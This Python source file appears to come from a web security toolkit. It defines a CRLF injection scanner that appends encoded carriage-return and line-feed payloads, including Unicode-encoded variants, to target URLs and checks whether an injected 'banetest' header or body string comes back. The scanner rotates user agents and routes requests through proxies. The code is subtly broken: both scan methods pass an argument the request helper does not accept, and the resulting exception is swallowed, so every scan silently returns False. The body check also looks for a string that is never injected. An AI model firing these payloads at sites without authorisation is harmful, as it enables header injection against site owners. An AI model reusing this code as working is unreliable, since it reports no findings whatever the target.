from bane.scanners.vulnerabilities.utils import *


class CRLF_Injection_Scanner:

    @staticmethod
    def set_requests(
        u, method="GET", data={}, files={}, params={}, headers={}, proxy={}, timeout=15,shuffle_headers=False
    ):
        s = requests.Session()
        req = requests.Request(
            method=method, url=u, headers=headers, data=data, files=files, params=params
        )
        prep = req.prepare()
        prep.url = u
        prep.headers
        return s.send(prep, verify=False, proxies=proxy, timeout=timeout)


    @staticmethod
    def crlf_unicode_encode(
        random_level=0, line_feed_only=False, carriage_return_only=False
    ):
        if line_feed_only == False and carriage_return_only == False:
            if random_level == 1:
                return random.choice(["%E5%98%8D", "%0d"]) + random.choice(
                    ["%E5%98%8A", "%0a"]
                )
            if random_level == 2:
                return "%E5%98%8D%E5%98%8A"
            else:
                return "%0d%0a"
        else:
            if line_feed_only == True and carriage_return_only == False:
                if random_level == 1:
                    return random.choice(["%E5%98%8A", "%0a"])
                if random_level == 2:
                    return "%E5%98%8A"
                else:
                    return "%0a"
            if carriage_return_only == True and line_feed_only == False:
                if random_level == 1:
                    return random.choice(["%E5%98%8D", "%0d"])
                if random_level == 2:
                    return "%E5%98%8D"
                else:
                    return "%0d"
        return "%0d%0a"


    @staticmethod
    def scan_header(
        u,
        unicode_random_level=0,
        carriage_return_only=False,
        line_feed_only=False,
        timeout=10,
        user_agent=None,
        cookie=None,
        debug=False,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
        ):
        proxies=get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        if cookie:
            heads = {"User-Agent": us, "Cookie": cookie}
        else:
            heads = {"User-Agent": us}
        heads.update(headers)
        try:
            r = CRLF_Injection_Scanner.set_requests(
                u
                + CRLF_Injection_Scanner.crlf_unicode_encode(
                    random_level=unicode_random_level,
                    line_feed_only=line_feed_only,
                    carriage_return_only=carriage_return_only,
                )
                + "banetest:%20test",
                method="GET",
                headers=heads,
                proxy=setup_proxy(proxies),
                timeout=timeout,
                verify=False,
            )
            return "banetest" in r.headers
        except Exception as e:
            pass
        return False


    @staticmethod
    def scan_body(
        u,
        unicode_random_level=0,
        carriage_return_only=False,
        line_feed_only=False,
        timeout=10,
        user_agent=None,
        cookie=None,
        debug=False,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
        ):
        proxies=get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        if cookie:
            heads = {"User-Agent": us, "Cookie": cookie}
        else:
            heads = {"User-Agent": us}
        heads.update(headers)
        try:
            r = CRLF_Injection_Scanner.set_requests(
                u
                + CRLF_Injection_Scanner.crlf_unicode_encode(
                    random_level=unicode_random_level,
                    line_feed_only=line_feed_only,
                    carriage_return_only=carriage_return_only,
                )
                + CRLF_Injection_Scanner.crlf_unicode_encode(
                    random_level=unicode_random_level,
                    line_feed_only=line_feed_only,
                    carriage_return_only=carriage_return_only,
                )
                + "banetest:%20test",
                method="GET",
                headers=heads,
                proxy=setup_proxy(proxies),
                timeout=timeout,
                verify=False,
            )
            return "banetest;$@*" in r.text
        except Exception as e:
            pass
        return False

